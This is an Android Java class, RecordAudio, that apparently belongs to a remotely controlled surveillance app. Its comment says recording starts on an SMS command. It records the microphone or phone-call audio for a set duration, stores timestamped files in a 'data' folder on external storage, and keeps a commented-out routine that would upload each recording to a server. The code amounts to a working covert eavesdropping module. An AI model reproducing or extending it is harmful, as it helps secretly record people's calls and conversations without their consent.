package com.inet.android.audio;

import java.io.File;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

import android.media.MediaRecorder;
import android.os.Environment;

import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

/**
 * RecordAudio class is designed to record audio after command
 * smsBroadcastReceiver
 * 
 * @author johny homicide
 * 
 */
public final class RecordAudio {

	private MediaRecorder mMediaRecorder;
	private String time;
	private static final String mPathName = "data";

	// Thread pool
	private ExecutorService mThreadPool;
	private AtomicBoolean mIsRecording = new AtomicBoolean(false);
	private String outputFileName;
	private String LOG_TAG = RecordAudio.class.getSimpleName().toString();
	private final int MINUTE = 60;
	private int source = 0;
	private int minute = -1;
	
	public RecordAudio(int minute,  int source) {
		Logging.doLog(LOG_TAG, " RecordAudio", " RecordAudio");
		mThreadPool = Executors.newCachedThreadPool();
		this.minute = minute * MINUTE;
		this.source = source;
		}

	// --------create Record and start recording---------------
	private void createRecord(int source, String fileName) {
		// reset any previous paused position
		// initialise MediaRecorder
		if (mMediaRecorder == null) {
			mMediaRecorder = new MediaRecorder();
				switch (source) {
			case 1:
				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);		
				break;
			case 2:
				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_UPLINK);		
				break;
			case 3:
				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_DOWNLINK);		
				break;
			case 4:
				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);		
				break;
			case 5:
				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);		
				break;
			case 6:
				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);		
				break;
			default:
				mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);		
				break;
			}
				
			mMediaRecorder
					.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
			mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
			mMediaRecorder.setAudioEncodingBitRate(16);
			mMediaRecorder.setAudioSamplingRate(44100);

			mMediaRecorder.setOnErrorListener(new RecorderErrorListener());
		} else {
			mMediaRecorder.stop();
			mMediaRecorder.reset();
		}

		mMediaRecorder.setOutputFile(fileName);
		try {
			mMediaRecorder.prepare();
			mMediaRecorder.start();
			Logging.doLog(LOG_TAG,
					"mMediaRecorder.start()", "mMediaRecorder.start()");
		} catch (IllegalStateException e) {
			Logging.doLog(LOG_TAG,
					"IllegalStateException thrown while trying to record a greeting");
			e.printStackTrace();
			mMediaRecorder.release();
			mMediaRecorder = null;
		} catch (IOException e) {
			Logging.doLog(LOG_TAG,
					"IOException thrown while trying to record a greeting");
			e.printStackTrace();
			mMediaRecorder.release();
			mMediaRecorder = null;
		}
	}

	// --------create Recording----------------
	public void executeRecording() {
		mThreadPool.execute(new Runnable() {

			@Override
			public void run() {
				outputFileName = getOutputFileName();
				if (outputFileName != null) {
					Logging.doLog(LOG_TAG, "executeRecording",
							"executeRecording");
					createRecord(source, outputFileName);
					mIsRecording.set(true);
					// launch tehe counter
					Logging.doLog(LOG_TAG, "mThreadPool.execute",
							"mThreadPool.execute");
					if (minute != -1) {
						Logging.doLog(LOG_TAG, "minute != -1" + minute,
								"minute != -1" + minute);
						mThreadPool.execute(new RecordingCounterUpdater());
					}
				}
			}
		});
	}
	public void executeStopAfterCallRecordng(){
		mThreadPool.execute(new RecordingCounterUpdater());
	}
	// --------stop recording and call sendAudio----------------
	public void executeStopRecording() {
		mThreadPool.execute(new Runnable() {
			@Override
			public void run() {
				if (mMediaRecorder != null) {
					stopRecording();
					mIsRecording.set(false);
//					if (outputFileName != null)
//						sendAudio(outputFileName);
					outputFileName = null;
				}

			}
		});

	}

	/**
	 * Creates and gets output file name
	 * 
	 * @return
	 */
	private String getOutputFileName() {
		// create media file
		String dir = Environment.getExternalStorageDirectory()
				.getAbsolutePath() + File.separator + mPathName;
		File filePath = new File(dir);
		if (!filePath.exists()) {
			filePath.mkdirs();
		}
		time = ConvertDate.logTime();
		String file = dir + "/" + time + ".aac";
		Logging.doLog(LOG_TAG, "file " + file, "file " + file);
		File audioFile = new File(file);
		try {
			if (!audioFile.exists()) {
				audioFile.createNewFile();
			}
		} catch (IOException e) {
			Logging.doLog(LOG_TAG, "Unable to create media file!");
			e.printStackTrace();
		}

		return audioFile.getAbsolutePath();
	}

	/**
	 * Updates duration counter while recording a message.
	 */
	private final class RecordingCounterUpdater implements Runnable {

		@Override
		public void run() {
			int currentCounter = 0;
			while (mIsRecording.get()) {
				postCounterUpdateMessage(currentCounter);
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
					// Re-assert the thread's interrupted status
					Thread.currentThread().interrupt();
					return;
				}
				currentCounter++;
			}
		}
	}

	/**
	 * Posts current position in the voice file to the Handler.
	 */
	private void postCounterUpdateMessage(int currentPosition) {
		Logging.doLog(LOG_TAG,
				String.format("posting counter update of:%d", currentPosition),
				String.format("posting counter update of:%d", currentPosition));
		if (currentPosition == minute) {
			Logging.doLog(LOG_TAG, "equals = " + minute, "equals = " + minute);
			executeStopRecording();
		}
	}

	private void stopRecording() {
		if (mMediaRecorder != null) {
			Logging.doLog(LOG_TAG, "Stopping recording", "Stopping recording");
			mMediaRecorder.stop();
			mMediaRecorder.release();
			mMediaRecorder = null;
		}
	}

//	private void sendAudio(String path) {
//		Logging.doLog(LOG_TAG, "sendAudio", "sendAudio");
//		// if (!RequestList.getLastFile().equals(path)) {
//		RequestList.setLastFile(path);
//		RequestList.sendFileRequest(ConstantRequest.TYPE_AUDIO_REQUEST, path, mContext);
//		// }
//	}

	/**
	 * Listener for the MediaRecorder error messages.
	 */
	public class RecorderErrorListener implements
			android.media.MediaRecorder.OnErrorListener {

		@Override
		public void onError(MediaRecorder mp, int what, int extra) {

			String whatDescription = "";

			switch (what) {
			case MediaRecorder.MEDIA_RECORDER_ERROR_UNKNOWN:
				whatDescription = "MEDIA_RECORDER_ERROR_UNKNOWN";
				break;
			default:
				whatDescription = Integer.toString(what);
				break;
			}
			Logging.doLog(LOG_TAG, String.format(
					"MediaRecorder error occured: %s,%d", whatDescription,
					extra), String.format("MediaRecorder error occured: %s,%d",
					whatDescription, extra));
		}
	}

}
